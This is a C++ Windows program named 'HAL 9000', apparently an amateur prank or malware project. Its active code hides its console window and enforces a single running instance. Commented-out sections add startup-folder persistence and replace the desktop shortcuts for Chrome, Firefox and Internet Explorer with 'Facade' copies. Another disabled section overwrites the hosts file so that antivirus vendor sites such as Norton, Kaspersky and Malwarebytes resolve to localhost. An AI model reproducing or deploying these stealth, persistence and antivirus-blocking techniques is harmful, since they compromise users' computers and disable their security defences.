/*====================================================================================================================================
HAL 9000
Heuristically programmed ALgorithmic computer
======================================================================================================================================*/

//NOTE: (TERNARY CONDITION (something = this ? 12 : 2)) should be implemented
//IMPORTANT: 'Program Files' IS THE BASE, SET EVERYTHING ACCORDINGLY: FACADE SHORTCUTS, POINTERS, ETC

#include <windows.h>
#include <WinDef.h>
#include <psapi.h>
#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <unistd.h>
#include <direct.h>
#include <string>
#include <tchar.h>
#include <chrono>
#include <thread>
#include <functional>
#include "sources.h"
using namespace std;

HBITMAP hBitmap = NULL;


/* This is where all the input to the window goes to */
LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
	switch(Message) {
		
		/* Upon destruction, tell the main thread to stop */
		case WM_DESTROY: {
			//system("FedSeizure.exe");
			PostQuitMessage(0);
			break;
		}
		
		case WM_ENDSESSION: {
			system("NIRcmd\\abort.bat");
			break;
		}
		
		default:
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}

void GetDesktopResolution(int& horizontal, int& vertical)
{
   RECT desktop;
   const HWND hDesktop = GetDesktopWindow();
   GetWindowRect(hDesktop, &desktop);
   horizontal = desktop.right;
   vertical = desktop.bottom;
}

void Stealth()
{
 HWND Stealth;
 AllocConsole();
 Stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(Stealth,0);
}

void chronometer(std::function<void(void)> func, unsigned int interval) {
    std::thread([func, interval]() {
        while (true){
            func();
            std::this_thread::sleep_for(std::chrono::milliseconds(interval));
        }
    }).detach();
}

void processProber() {
	remove("Records\\processes.txt");
	system("tasklist >> Records\\processes.txt");
	int extant;
	string procLine;
    ifstream processes;
    processes.open ("Records\\processes.txt");
    if(processes.is_open())
    {
        while(!processes.eof())
        {
            getline(processes,procLine);
            if ((extant = procLine.find("chryg7ugjome.exe", 0)) != string::npos) 
            {
             Beep(500, 3000);
    }
            }
        }
        processes.close();
    }

void fileCreate()
{
	ofstream outputFile("HALfile.txt");
	outputFile << "writing to file";
	outputFile.close();
}

void dirCreate() {
	mkdir("c:/myfolder");
}

void *pvoid;

/* The 'main' function of Win32 GUI programs: this is where execution starts */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	
	/* Mutex */ 
	
	const char szUniqueNamedMutex[] = "Heuristic_ALgorithm";
   HANDLE hHandle = CreateMutex( NULL, TRUE, szUniqueNamedMutex );
   if( ERROR_ALREADY_EXISTS == GetLastError() ) {
       ReleaseMutex( hHandle ); 
   CloseHandle( hHandle ); 
   return( 1 );
   }
   
   /* ---------------------------------------------------------------------------------------------------------------------------------------------------------- */
   
   	/* Elevation */
	
/*	for(int i = 0; i <= 1000; i++){
		SetCursorPos(i, i);
		Sleep(2);
	}
	*/
   
   /* ---------------------------------------------------------------------------------------------------------------------------------------------------------- */
	
	/* Intrinsic Implementation */
	
	int horizontal = 0;
	int vertical = 0;
	GetDesktopResolution(horizontal, vertical);
	Stealth();
	WNDCLASSEX wc; /* A properties struct of our window */
	HWND hwnd; /* A 'HANDLE', hence the H, or a pointer to our window */
	MSG msg; /* A temporary location for all messages */
	
	int threatController = 0; //NOTE: use file to decide whether a task should be repeated
	
	string username;
    username = getenv("USERNAME");
    
    string domain;
    domain = getenv("USERDOMAIN");
    
    string HALchrome;
    HALchrome = "Facade\\Google Chrome.lnk";
    
    string HALfirefox;
    HALfirefox = "Facade\\Mozilla Firefox.lnk";
    
    string HALiexplore;
    HALiexplore = "Facade\\Internet Explorer.lnk";
    
    string userDeskPath;
    userDeskPath = "C:\\Users\\" + username + "\\Desktop\\Google Chrome.lnk";
	
	string publicDeskPath;
    publicDeskPath = "C:\\Users\\Public\\Desktop\\Google Chrome.lnk";
	
	string rmChromeConcat = "C:\\Users\\" + username + "\\Desktop\\Google Chrome.lnk";
	const char * rmChrome = rmChromeConcat.c_str();
	
	string rmFirefoxConcat = "C:\\Users\\" + username + "\\Desktop\\Mozilla Firefox.lnk";
	const char * rmFirefox = rmFirefoxConcat.c_str();
	
	string rmIexploreConcat = "C:\\Users\\" + username + "\\Desktop\\Internet Explorer.lnk";
	const char * rmIexplore = rmIexploreConcat.c_str();
	
	
	/* ---------------------------------------------------------------------------------------------------------------------------------------------------------- */
	
	/* Information Accumulation */
	
	//chronometer(processProber, 60000);

	/* ---------------------------------------------------------------------------------------------------------------------------------------------------------- */
	
	/* Support Systems */
	
	/*
	if(!(ifstream("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\HAL.exe"))) {
		CopyFile( "Configuration\\HALpointer.bat", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\HALpointer.bat", TRUE );
	}

	if(ifstream(rmChrome)) {
		CopyFile( HALchrome.c_str(), userDeskPath.c_str(), FALSE );
	}
		else if (ifstream("C:\\Users\\Public\\Desktop\\Google Chrome.lnk")) {
		CopyFile( HALchrome.c_str(), publicDeskPath.c_str(), FALSE );
	}
	
	if(ifstream(rmFirefox)) {
		CopyFile( HALfirefox.c_str(), userDeskPath.c_str(), FALSE );
	}
		else if (ifstream("C:\\Users\\Public\\Desktop\\Mozilla Firefox.lnk")) {
		CopyFile( HALfirefox.c_str(), publicDeskPath.c_str(), FALSE );
	}
	
	if(ifstream(rmIexplore)) {
		CopyFile( HALiexplore.c_str(), userDeskPath.c_str(), FALSE );
	}
		else if (ifstream("C:\\Users\\Public\\Desktop\\Internet Explorer.lnk")) {
		CopyFile( HALiexplore.c_str(), publicDeskPath.c_str(), FALSE );
	}
	
	*/
	/* ---------------------------------------------------------------------------------------------------------------------------------------------------------- */
	
	/* Threat Aversion */
	/*
	ofstream outputFile("Records\\threatController.txt");
	outputFile << "Threat Control Center\nThreat aversion tactics have been successfully implemented.";
	outputFile.close();
	
	
	if(!(ifstream("Records\\threatController.txt"))) {
	ofstream outputFile("C:\\Windows\\System32\\drivers\\etc\\hosts");
	outputFile << "127.0.0.1 us.norton.com\n127.0.0.1 norton.com\n127.0.0.1 www.avg.com\n127.0.0.1 avg.com\n127.0.0.1 www.malwarebytes.com\n127.0.0.1 malwarebytes.com\n127.0.0.1 usa.kaspersky.com\n127.0.0.1 kaspersky.com\n127.0.0.1 www.avira.com\n127.0.0.1 avira.com\n127.0.0.1 www.mcafee.com\n127.0.0.1 mcafee.com\n127.0.0.1 www.avast.com\n127.0.0.1 avast.com\n127.0.0.1 www.pandasecurity.com\n127.0.0.1 pandasecurity.com";
	outputFile.close();
	}
	*/
	/* ---------------------------------------------------------------------------------------------------------------------------------------------------------- */
	
	/* Countermeasures */
	
	//PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2); - turns off monitor
    //SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_TASKLIST, (LPARAM) 0); - opens start menu
	
	/* ---------------------------------------------------------------------------------------------------------------------------------------------------------- */
	
	/* Media */
	
	//ShellExecute(NULL, "open", "http://google.com", NULL, NULL, SW_SHOWNORMAL);
	//PlaySound(TEXT("Audio\\cantdo.wav"), NULL, SND_FILENAME | SND_ASYNC);
	
	/* ---------------------------------------------------------------------------------------------------------------------------------------------------------- */

	/* zero out the struct and set the stuff we want to modify */
	if ( false ) {
	memset(&wc,0,sizeof(wc));
	wc.cbSize		 = sizeof(WNDCLASSEX);
	wc.lpfnWndProc	 = WndProc; /* This is where we will send messages to */
	wc.hInstance	 = hInstance;
	wc.hCursor		 = LoadCursor(NULL, IDC_NO);
	
	/* White, COLOR_WINDOW is just a #define for a system color, try Ctrl+Clicking it */
	wc.hbrBackground=CreatePatternBrush((HBITMAP) LoadImage(GetModuleHandle(0),
                                      MAKEINTRESOURCE(IDB_HAL),
                                     IMAGE_BITMAP,horizontal,vertical,
                                     LR_CREATEDIBSECTION));
	wc.lpszClassName = "WindowClass";
	HICON hIcon = static_cast<HICON>(LoadImage(hInstance,
    MAKEINTRESOURCE(HALICON),
    IMAGE_ICON,
    64, 64,    // or whatever size icon you want to load
    LR_DEFAULTCOLOR));

	if(!RegisterClassEx(&wc)) {
		MessageBox(NULL, "Window Registration Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}

	hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,"WindowClass","HAL 9000",WS_VISIBLE,
		CW_USEDEFAULT, /* x */
		CW_USEDEFAULT, /* y */
		40, /* width */
		80, /* height */
		NULL,NULL,hInstance,NULL);

	if(hwnd == NULL) {
		MessageBox(NULL, "Communication System Failure!","Aborting",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}
	
	ShowWindow(hwnd, SW_MAXIMIZE);
	UpdateWindow(hwnd);
}

	if ( false ) {
	
    int msgboxID = MessageBox(NULL, "HAL IS OPERATIONAL","HAL 9000",MB_SYSTEMMODAL|MB_OK|MB_CANCELTRYCONTINUE );

    switch (msgboxID)
    {
    case IDCANCEL:
        return 0;
        break;
    case IDTRYAGAIN:
        return 0;
        break;
    case IDCONTINUE:
        return 0;
        break;
    }

    return msgboxID;
}
	
	while(GetMessage(&msg, NULL, 0, 0) > 0) { 
	}
	return msg.wParam;
}
